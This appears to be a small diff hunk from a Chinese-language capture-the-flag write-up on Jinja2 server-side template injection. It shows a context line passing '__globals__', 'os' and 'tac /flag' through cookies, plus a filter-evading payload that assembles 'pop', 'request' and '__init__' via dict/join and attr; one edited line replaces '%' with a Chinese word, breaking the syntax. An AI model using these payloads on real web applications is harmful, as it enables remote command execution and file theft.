@@ -373,7 +373,7 @@ Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 
 ```
 ?name=
-{% set po=dict(po=1,p=2)|join%}
+{% set po=dict(po=1,p=2)|join百分号}
 {% set a=(()|select|string|list)|attr(po)(24)%}
 {% set re=dict(reque=1,st=1)|join%}
 {% set in=(a~a~dict(init=a)|join~a~a)|join()%}
